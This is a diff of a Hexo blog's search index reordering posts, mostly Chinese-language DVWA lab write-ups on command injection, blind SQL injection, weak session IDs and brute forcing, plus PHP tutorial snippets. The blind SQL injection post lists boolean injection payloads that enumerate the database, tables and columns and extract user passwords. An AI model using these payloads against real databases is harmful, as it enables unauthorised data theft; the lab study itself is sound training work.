+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211212857397.png"></p>
+<p>相关函数介绍</p>
+<p><em>stripslashes(string)</em></p>
+<p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p>
+<p><em>explode(separator,string,limit)</em></p>
+<p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
+<p><em>is_numeric(string)</em></p>
+<p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
+<p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -505,21 +513,6 @@
 <p>参考链接：</p>
 <p><a href="https://blog.csdn.net/manok/article/details/103552937">https://blog.csdn.net/manok/article/details/103552937</a></p>
 <p><a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
-]]></content>
-      <tags>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-sql(blind)</title>
-    <url>/2021/02/13/dvwa-sql-blind/</url>
-    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源代码，这里不支持报错注入，那看来只能用布尔和延时注入了</p>
-<p>因为有回显，就直接用布尔注入了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and length(database())=4<span class="hljs-comment">#</span><br><br>1&#x27; and substr(database())&lt;&#x27;m&#x27;(这里使用二分法)<br><br>1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span> (table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() )=<span class="hljs-number">2</span> <span class="hljs-comment">#(猜表的数量)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #（猜表名的字符数） </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count (column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-keyword">users</span><span class="hljs-string">&#x27; )=2 #（猜列的数量）</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user_id,first_name,last_name,password from dvwa.users limit 0,1),2,1))&lt;&#x27;</span>m<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure>
-
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>界面同sql-medium ，抓个包即可进行布尔和延时注入。</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看了源码后发现，延时注入受到影响，使用布尔注入，打法同low，源码的设置与sql-high的相似。</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>还是PDO和Anti-CSRFtoken组合的方式，来提高安全性。</p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -588,6 +581,54 @@
       </tags>
   </entry>
   <entry>
+    <title>dvwa-sql(blind)</title>
+    <url>/2021/02/13/dvwa-sql-blind/</url>
+    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源代码，这里不支持报错注入，那看来只能用布尔和延时注入了</p>
+<p>因为有回显，就直接用布尔注入了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and length(database())=4<span class="hljs-comment">#</span><br><br>1&#x27; and substr(database())&lt;&#x27;m&#x27;(这里使用二分法)<br><br>1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span> (table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() )=<span class="hljs-number">2</span> <span class="hljs-comment">#(猜表的数量)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #（猜表名的字符数） </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count (column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-keyword">users</span><span class="hljs-string">&#x27; )=2 #（猜列的数量）</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user_id,first_name,last_name,password from dvwa.users limit 0,1),2,1))&lt;&#x27;</span>m<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>界面同sql-medium ，抓个包即可进行布尔和延时注入。</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看了源码后发现，延时注入受到影响，使用布尔注入，打法同low，源码的设置与sql-high的相似。</p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>还是PDO和Anti-CSRFtoken组合的方式，来提高安全性。</p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-weak session ids</title>
+    <url>/2021/02/16/dvwa-weak-session-ids/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
+<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
+<p>通过hackbar，</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
+<p>即可登录会话</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
+<p>这边的id数依次加一</p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
+<p>dvwasession换成了时间戳 </p>
+<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
+<p>感觉和medium蛮像的</p>
+<p>不如把这几个的源代码来比较一下</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
+<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
+<p>但是我这里无论怎么抓包结果都是上上张图</p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
+<p>来看看源码</p>
+<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
+
+<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa-sql</title>
     <url>/2021/02/12/dvwa-sql/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一段时间也是过完sqllib的，直接上手应该没什么问题</p>
@@ -615,6 +656,41 @@
 <h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/12/dvwa-sql/image-20210213194114126.png"></p>
 <p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
 <p>参考资料：<a href="https://www.freebuf.com/articles/web/120747.html">https://www.freebuf.com/articles/web/120747.html</a></p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-暴力破解</title>
+    <url>/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>来看看源码</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132533183.png"></p>
+<p>可以说是什么防护措施都没有了，虽然说这里是暴力破解，但是我觉得sql注入也是可以的，那就试一下</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211124758657.png"></p>
+<p>这里密码随意输入即可成功，但很有意思的事，这个前提条件是网址为127.0.0.1才行，用本机ip地址并不成功</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以用brupsuite进行爆破</p>
+<p>先来抓个包吧</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211131651289.png"></p>
+<p>然后选好密码字典进行爆破（如果字典选不好的话，就爆破不了了或者是爆破时间相当的长）</p>
+<h1 id="midumn"><a href="#midumn" class="headerlink" title="midumn"></a>midumn</h1><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132834686.png"></p>
+<p>相比low的明显就有了变化</p>
+<p>mysql_real_escape_string(),这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，因此这里不能在进行sql注入</p>
+<p>但是在这里依然可以用brupsuite进行爆破，方法同low</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>在medium的基础上，增加了stripslashes( )函数删除由 addslashes() 函数添加的反斜杠,如果有两个连续的反斜线,则只去掉一个。、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
+<p>看看还增加了什么，token而且还是在登陆时随机产生的，且优先级高于sql查询，那直接爆破的话看起来是不行了</p>
+<p>这边的爆破方法我参考了这篇文章 <a href="https://blog.csdn.net/m0_46432705/article/details/106364716">https://blog.csdn.net/m0_46432705/article/details/106364716</a></p>
+<p>但是token没有复制成功去查了一下发现</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211142953061.png"></p>
+<p>我原来这边的设置是never，所以无法实现服务器返回的token</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211143415491.png"></p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210212223913790.png"><span class="image-caption">image-20210212223913790</span></p>
+<p>找找返回长度不同的，试一下就知道密码了<del>（手动滑稽</del></p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>看了一下和high的源代码蛮像的</p>
+<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211144228923.png"></p>
+<p>然后还多了个</p>
+<p>这是因为不能使用PDO扩展本身执行任何数据库操作，从而阻止破坏sql语句结构执行恶意的sql命令。</p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -751,72 +827,22 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-weak session ids</title>
-    <url>/2021/02/16/dvwa-weak-session-ids/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
-<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
-<p>通过hackbar，</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
-<p>即可登录会话</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
-<p>这边的id数依次加一</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
-<p>dvwasession换成了时间戳 </p>
-<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
-<p>感觉和medium蛮像的</p>
-<p>不如把这几个的源代码来比较一下</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
-<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
-<p>但是我这里无论怎么抓包结果都是上上张图</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
-<p>来看看源码</p>
-<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
+    <title>Hello World</title>
+    <url>/2020/10/02/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <tags>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-暴力破解</title>
-    <url>/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>来看看源码</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132533183.png"></p>
-<p>可以说是什么防护措施都没有了，虽然说这里是暴力破解，但是我觉得sql注入也是可以的，那就试一下</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211124758657.png"></p>
-<p>这里密码随意输入即可成功，但很有意思的事，这个前提条件是网址为127.0.0.1才行，用本机ip地址并不成功</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以用brupsuite进行爆破</p>
-<p>先来抓个包吧</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211131651289.png"></p>
-<p>然后选好密码字典进行爆破（如果字典选不好的话，就爆破不了了或者是爆破时间相当的长）</p>
-<h1 id="midumn"><a href="#midumn" class="headerlink" title="midumn"></a>midumn</h1><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132834686.png"></p>
-<p>相比low的明显就有了变化</p>
-<p>mysql_real_escape_string(),这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，因此这里不能在进行sql注入</p>
-<p>但是在这里依然可以用brupsuite进行爆破，方法同low</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>在medium的基础上，增加了stripslashes( )函数删除由 addslashes() 函数添加的反斜杠,如果有两个连续的反斜线,则只去掉一个。、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
-<p>看看还增加了什么，token而且还是在登陆时随机产生的，且优先级高于sql查询，那直接爆破的话看起来是不行了</p>
-<p>这边的爆破方法我参考了这篇文章 <a href="https://blog.csdn.net/m0_46432705/article/details/106364716">https://blog.csdn.net/m0_46432705/article/details/106364716</a></p>
-<p>但是token没有复制成功去查了一下发现</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211142953061.png"></p>
-<p>我原来这边的设置是never，所以无法实现服务器返回的token</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211143415491.png"></p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210212223913790.png"><span class="image-caption">image-20210212223913790</span></p>
-<p>找找返回长度不同的，试一下就知道密码了<del>（手动滑稽</del></p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>看了一下和high的源代码蛮像的</p>
-<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211144228923.png"></p>
-<p>然后还多了个</p>
-<p>这是因为不能使用PDO扩展本身执行任何数据库操作，从而阻止破坏sql语句结构执行恶意的sql命令。</p>
-]]></content>
-      <tags>
-        <tag>dvwa</tag>
-      </tags>
   </entry>
   <entry>
     <title>dvwa-insecure CAPTCHA</title>
@@ -873,24 +899,6 @@
       <tags>
         <tag>dvwa</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/10/02/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>随机点大福</title>
@@ -980,22 +988,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHP语句</title>
-    <url>/2020/10/24/php%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<h2 id="PHP条件语句"><a href="#PHP条件语句" class="headerlink" title="PHP条件语句"></a>PHP条件语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a nice day!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<h3 id="if…else-语句"><a href="#if…else-语句" class="headerlink" title="if…else 语句"></a>if…else 语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good day!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good night!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<h3 id="if…elseif…else-语句"><a href="#if…elseif…else-语句" class="headerlink" title="if…elseif…else 语句"></a>if…elseif…else 语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;10&quot;</span>)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good morning!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good day!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good night!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<h2 id="PHP-Switch语句"><a href="#PHP-Switch语句" class="headerlink" title="PHP Switch语句"></a>PHP Switch语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$favcolor=<span class="hljs-string">&quot;red&quot;</span>;<br><span class="hljs-keyword">switch</span> ($favcolor)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;red&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是红色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;blue&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是蓝色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;green&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是绿色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色不是这三个！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br>  <span class="hljs-comment">#输出结果：</span><br><span class="hljs-comment">#你喜欢的颜色是红色！ </span><br><br><br><br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php</title>
     <url>/2020/10/16/php/</url>
     <content><![CDATA[<h2 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h2><h3 id="设置PHP常量"><a href="#设置PHP常量" class="headerlink" title="设置PHP常量"></a>设置PHP常量</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> define ( <span class="hljs-keyword">string</span> $name , mixed $value [ , <span class="hljs-keyword">bool</span> $case_insensitive = <span class="hljs-literal">false</span> ])<br></code></pre></td></tr></table></figure>
@@ -1063,6 +1055,65 @@
       </tags>
   </entry>
   <entry>
+    <title>PHP语句</title>
